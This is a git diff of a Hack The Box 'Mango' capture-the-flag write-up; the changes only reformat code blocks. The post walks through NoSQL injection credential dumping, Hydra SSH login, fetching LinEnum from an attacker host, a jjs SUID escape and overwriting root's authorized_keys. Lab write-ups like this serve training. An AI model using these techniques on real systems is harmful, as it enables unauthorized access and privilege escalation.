@@ -1,9 +1,8 @@
 ---
-layout: post
-title:  "Hack The Box - Mango"
-date:   2020-04-19 05:00:00 +0800
-categories: hackthebox
-tags: mongodb jjs ssh linux
+title: Hack The Box - Mango
+date: 2020-04-19 05:00:00 +0800
+categories: [hackthebox]
+tags: [mongodb, jjs, ssh, linux]
 ---
 
 ![](/assets/images/mango.png){:height="414px" width="615px"}
@@ -14,14 +13,14 @@ The operating systems that I will be using to tackle this machine is a Kali Linu
 
 What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
 
-{% highlight bash %}
+```bash
 $ echo "10.10.10.162 mango.htb" >> /etc/hosts
-{% endhighlight %}
+```
 
 # Reconnaissance
 
 Using `nmap`, we are able to determine the open ports and running services on the machine.
-{% highlight bash %}
+```bash
 $ nmap -sV -sT -sC mango.htb
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-17 13:05 EST
 Nmap scan report for mango.htb (10.10.10.162)
@@ -50,7 +49,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 54.48 seconds
 
-{% endhighlight %}
+```
 
 # Enumeration (1)
 
@@ -74,11 +73,11 @@ If we check our `nmap` results again and look closely at the `ssl-cert` informat
 
 Lets add `staging-order.mango.htb` to our `/etc/hosts` and see if that changes anything.
 
-{% highlight bash %}
+```bash
 $ cat /etc/hosts
 ...
 10.10.10.162 mango.htb staging-order.mango.htb
-{% endhighlight %}
+```
 
 ![](/assets/images/mango5.png)
 
@@ -98,7 +97,7 @@ And got redirected to `/home.php`!
 
 Seems like the web app is vulnerable to `NoSQL` injections! I then made a script to help me automate the dumping out of the credentials in the database:
 
-{% highlight python %}
+```python
 import requests
 import string
 from urllib import quote_plus
@@ -207,18 +206,18 @@ def main():
 if __name__ == "__main__":
 	main()
 
-{% endhighlight %}
+```
 
 It takes a while to run (perhaps optimize using binary search?), but we managed to dump out 2 sets of credentials:
 
-{% highlight bash %}
+```bash
 [*] Found admin:t9KcS3>!0B#2
 [*] Found mango:h3mXK8RhU~f{]f5H
-{% endhighlight %}
+```
 
 The web app doesn't seem to have any other functionality that we can exploit so lets see if we can try using these credentials on the `ssh` service!
 
-{% highlight bash %}
+```bash
 $ cat user.txt
 admin
 mango
@@ -237,11 +236,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-04-18 15:17:
 [22][ssh] host: mango.htb   login: mango   password: h3mXK8RhU~f{]f5H
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-04-18 15:17:41
-{% endhighlight %}
+```
 
 Using this set of credentials, we can `ssh` into the box:
 
-{% highlight bash %}
+```bash
 $ ssh mango@mango.htb
 mango@mango.htb's password:
 mango@mango:~$ ls -al 
@@ -259,18 +258,18 @@ drwxrwxr-x 3 mango mango 4096 Apr 18 16:29 .local
 -rw-r--r-- 1 mango mango  807 Apr  4  2018 .profile
 drwx------ 2 mango mango 4096 Apr 18 18:31 .ssh
 -rw------- 1 mango mango  858 Apr 18 19:04 .viminfo
-{% endhighlight %}
+```
 
 Where's the `user.txt`? Lets see if there are any other possible users on the box.
 
-{% highlight bash %}
+```bash
 mango@mango:~$ ls -al /home
 total 16
 drwxr-xr-x  4 root  root  4096 Sep 27  2019 .
 drwxr-xr-x 23 root  root  4096 Sep 27  2019 ..
 drwxr-xr-x  4 admin admin 4096 Apr 18 19:26 admin
 drwxr-xr-x  6 mango mango 4096 Apr 18 19:04 mango
-{% endhighlight %}
+```
 
 Seems like `admin` has the `user.txt`!
 
@@ -278,34 +277,34 @@ Seems like `admin` has the `user.txt`!
 
 Using `su` and the admin credentials we found in the web app database, we are able to login as `admin`.
 
-{% highlight bash %}
+```bash
 mango@mango:~$ su admin
 Password: 
 $ whoami
 admin
-{% endhighlight %}
+```
 
 Getting the flag was a piece of cake:
-{% highlight bash %}
+```bash
 $ cat ~/user.txt
 79bfXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 # Enumeration(2)
 
 As usual, I will use [`LinEnum`](https://github.com/rebootuser/LinEnum) to enumerate for ways to escalate to `root`.
 
 Spawning web server:
-{% highlight bash %}
+```bash
 $ mkdir httpserver
 $ cd httpserver
 $ cp ~/LinEnum.sh .
 $ python3 -m http.server 80 
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-{% endhighlight %}
+```
 
 Retrieving the script:
-{% highlight bash %}
+```bash
 $ cd /tmp
 $ wget http://10.10.XX.XX/LinEnum.sh
 --2020-04-18 20:04:09--  http://10.10.XX.XX/LinEnum.sh
@@ -317,47 +316,47 @@ Saving to: ‘LinEnum.sh’
 LinEnum.sh                                     100%[====================================================================================================>]  45.39K  78.8KB/s    in 0.6s    
 
 2020-04-18 20:04:10 (78.8 KB/s) - ‘LinEnum.sh’ saved [46476/46476]
-{% endhighlight %}
+```
 
 Running the script:
-{% highlight bash %}
+```bash
 $ chmod +x LinEnum.sh
 $ ./LinEnum.sh
 ...
 [+] Possibly interesting SUID files:
 -rwsr-sr-- 1 root admin 10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-{% endhighlight %}
+```
 
 Alright, we can use this executable to escalate our privileges! With the `SUID` bit set on the file, we can execute `jjs` as if we are `root`.
 
 According to [`GTFOBins`](https://gtfobins.github.io/gtfobins/jjs/), we are able to spawn an interactive shell with elevated permissions:
 
-{% highlight bash %}
+```bash
 $ cd /usr/lib/jvm/java-11-openjdk-amd64/bin/
 $ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | ./jjs
 Warning: The jjs tool is planned to be removed from a future JDK release
 jjs> Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/pts/0 >/dev/pts/0 2>/dev/pts/0').waitFor()
 # 
-{% endhighlight %}
+```
 
 Unfortunately, it did spawn but it just hung there :( So we gotta think of an alternative way to get root shell.
 
 I tried to spawn a reverse shell back to my listener but it didn't work. However, I realised that I was able to perform very simple commands like "cp" and "mv" but no piping or redirection.
 
 So how about we write to `root`'s `authorized_keys` file?
-{% highlight bash %}
+```bash
 # cat /etc/ssh/sshd_config
 ...
 PermitRootLogin yes
 ...
 AllowUsers mango root
-{% endhighlight %}
+```
 
 # root.txt
 
 From the above config, we can confirm that we are able to `ssh` directly into the box as `root`. To do so, first we'll need to generate a `SSH` keypair.
 
-{% highlight bash %}
+```bash
 ssh-keygen -t rsa
 Generating public/private rsa key pair.
 Enter file in which to save the key (/root/.ssh/id_rsa): 
@@ -379,30 +378,30 @@ The key's randomart image is:
 |..oE.            |
 |o...             |
 +----[SHA256]-----+
-{% endhighlight %}
+```
 
 Open the public key`/root/.ssh/id_rsa.pub` and copy the contents into your clipboard.
 
 Echo it into a file in the `tmp` directory.
 
-{% highlight bash %}
+```bash
 # echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXGz/VwVW7AUU35k3HgAjJ7aYLCgE9miz7g4XvCsB+Bk/0NpQWIcd4PUXe4JSe0CK5Dgj2F5LVnKd6s87HN0v0s8RUcsDEKsnwYhIrHmL8G2nYgEl0Pixj7u67lHJbs1pCFfMP4Aj0pJzUoCHhroqXpkdj6P8/FHUnBKntyo51BXzqemUNrif3joCNF/AbQUTPBFMAHmciN2huxU8Q1E8vmVR3SXZbmKw4ZX8wj8sf49hJDCNm2qpiVNyB4nS8KaShMP69ya0mH9ynF2P0YF4nJJlbHcO/j9jvbK5NNMYQSl/xmyL+9okjExiXFH0yQulpDKWsnZv6s8N9K3ASwWIsyavxc7B1UnqOp2elLuRgLI/3QL5XXEEU+l7s/MJ5l9LTvSWBS4m2e1Xqlye41AJAE38p8qq0wX9q3AefEHlOnOcn5XiQQ9H37cx6dayf9B+gKim1G/KycAiURD8Q/+cNs9KCuS9p8gTdReA9ZMSLQ5dXV+tHd06ENAAPYY/HH58= root@kali" > /tmp/secret
-{% endhighlight %}
+```
 
 And now overwrite the `root`'s `authorized_keys` file!
 
-{% highlight bash %}
+```bash
 $ echo "Java.type('java.lang.Runtime').getRuntime().exec('cp /tmp/secret /root/.ssh/authorized_keys').waitFor()" | ./jjs
-{% endhighlight %}
+```
 
 Now, we are able to `ssh` into the `root` account using our private key `/root/id_rsa`:
 
-{% highlight bash %}
+```bash
 $ ssh -i /root/id_rsa root@mango.htb
 ...
 root@mango:~# cat root.txt
 8a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-{% endhighlight %}
+```
 
 
-## Rooted ! Thank you for reading and look forward for more writeups and articles !
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
